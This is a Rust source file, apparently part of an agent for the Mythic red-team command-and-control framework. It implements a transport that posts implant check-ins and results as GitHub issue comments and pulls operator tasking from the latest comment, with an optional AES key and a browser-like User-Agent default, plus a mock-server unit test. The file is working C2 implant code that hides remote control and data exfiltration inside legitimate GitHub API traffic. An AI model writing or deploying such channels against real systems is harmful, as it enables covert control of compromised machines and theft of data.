//! GitHub transport — minimal GitHub Issues/Comments implementation.
//!
//! Uses the GitHub REST API to post agent messages as issue comments and to
//! read tasking from issue comments. This is intentionally small and relies
//! only on `ureq` and `serde_json`.

use std::time::Duration;

use ureq::Agent;

use crate::{C2Transport, MythicError, MythicResult};

use super::DEFAULT_USER_AGENT;

/// Configuration for the Mythic `github` C2 profile.
#[derive(Debug, Clone, serde::Deserialize, serde::Serialize)]
pub struct GithubConfig {
    pub aes_psk: Option<String>,
    pub token: String,
    pub owner: String,
    pub repo: String,
    pub issue_number: u64,
    pub api_url: String,
    pub encrypted_exchange_check: bool,
    /// Optional override for the `User-Agent` header. Defaults to a common
    /// browser UA if not set.
    #[serde(default)]
    pub user_agent: Option<String>,
}

impl Default for GithubConfig {
    fn default() -> Self {
        Self {
            aes_psk: None,
            token: String::new(),
            owner: String::new(),
            repo: String::new(),
            issue_number: 1,
            api_url: "https://api.github.com".into(),
            encrypted_exchange_check: false,
            user_agent: None,
        }
    }
}

/// Synchronous GitHub-API transport.
pub struct GithubTransport {
    config: GithubConfig,
    agent: Agent,
}

impl GithubTransport {
    pub fn new(config: GithubConfig) -> MythicResult<Self> {
        let ua = config
            .user_agent
            .as_deref()
            .filter(|s| !s.is_empty())
            .unwrap_or(DEFAULT_USER_AGENT);
        let builder = Agent::config_builder()
            .timeout_global(Some(Duration::from_secs(30)))
            .http_status_as_error(false)
            .user_agent(ua);

        Ok(Self {
            config,
            agent: Agent::new_with_config(builder.build()),
        })
    }

    fn api_url(&self, path: &str) -> String {
        let base = self.config.api_url.trim_end_matches('/');
        format!("{}/{}", base, path.trim_start_matches('/'))
    }

    fn post_comment(&self, body: &str) -> MythicResult<String> {
        let url = self.api_url(&format!(
            "repos/{}/{}/issues/{}/comments",
            self.config.owner, self.config.repo, self.config.issue_number
        ));
        let payload = serde_json::json!({ "body": body }).to_string();
        let mut req = self.agent.post(&url);
        if !self.config.token.is_empty() {
            req = req.header("Authorization", &format!("Bearer {}", self.config.token));
        }
        let resp = req
            .header("Content-Type", "application/json")
            .send(&payload)
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        extract_comment_body(resp)
    }

    fn list_comments(&self) -> MythicResult<String> {
        let url = self.api_url(&format!(
            "repos/{}/{}/issues/{}/comments",
            self.config.owner, self.config.repo, self.config.issue_number
        ));
        let mut req = self.agent.get(&url);
        if !self.config.token.is_empty() {
            req = req.header("Authorization", &format!("Bearer {}", self.config.token));
        }
        let resp = req
            .call()
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        let status = resp.status().as_u16();
        if status >= 400 {
            return Err(MythicError::HttpStatus(status));
        }
        let text = resp
            .into_body()
            .read_to_string()
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        let comments: serde_json::Value =
            serde_json::from_str(&text).map_err(|e| MythicError::transport(format!("{e}")))?;
        comments
            .as_array()
            .and_then(|arr| arr.last())
            .and_then(|c| c.get("body").and_then(|b| b.as_str()))
            .map(|s| s.to_string())
            .ok_or(MythicError::InvalidPacket)
    }
}

impl C2Transport for GithubTransport {
    fn get_aes_psk(&self) -> Option<String> {
        self.config.aes_psk.clone()
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        self.config.aes_psk = Some(key.to_string());
        self.config.aes_psk.clone()
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.config.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> Result<String, MythicError> {
        self.post_comment(packed)
    }

    fn get_tasking(&self, _packed: &str) -> Result<String, MythicError> {
        self.list_comments()
    }

    fn post_response(&self, packed: &str) -> Result<String, MythicError> {
        self.post_comment(packed)
    }
}

fn extract_comment_body(resp: ureq::http::Response<ureq::Body>) -> MythicResult<String> {
    let status = resp.status().as_u16();
    if status >= 400 {
        return Err(MythicError::HttpStatus(status));
    }
    let text = resp
        .into_body()
        .read_to_string()
        .map_err(|e| MythicError::transport(format!("{e}")))?;
    let json: serde_json::Value =
        serde_json::from_str(&text).map_err(|e| MythicError::transport(format!("{e}")))?;
    json.get("body")
        .and_then(|b| b.as_str())
        .map(|s| s.to_string())
        .ok_or(MythicError::InvalidPacket)
}

#[cfg(test)]
mod tests {
    use super::*;
    use httptest::{Expectation, Server, matchers::*, responders::*};

    #[test]
    fn github_post_and_list_roundtrip() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(
                request::method("POST"),
                request::path("/repos/owner/repo/issues/1/comments")
            ))
            .respond_with(
                status_code(201)
                    .body(r#"{"body":"ack"}"#)
                    .insert_header("Content-Type", "application/json"),
            ),
        );
        srv.expect(
            Expectation::matching(all_of!(
                request::method("GET"),
                request::path("/repos/owner/repo/issues/1/comments")
            ))
            .respond_with(
                status_code(200)
                    .body(r#"[{"body":"tasking"}]"#)
                    .insert_header("Content-Type", "application/json"),
            ),
        );

        let url = srv.url("/");
        let cfg = GithubConfig {
            token: "tok".into(),
            owner: "owner".into(),
            repo: "repo".into(),
            issue_number: 1,
            api_url: url.to_string(),
            ..Default::default()
        };
        let t = GithubTransport::new(cfg).unwrap();
        assert_eq!(t.checkin("hello").unwrap(), "ack");
        assert_eq!(t.get_tasking("").unwrap(), "tasking");
    }
}
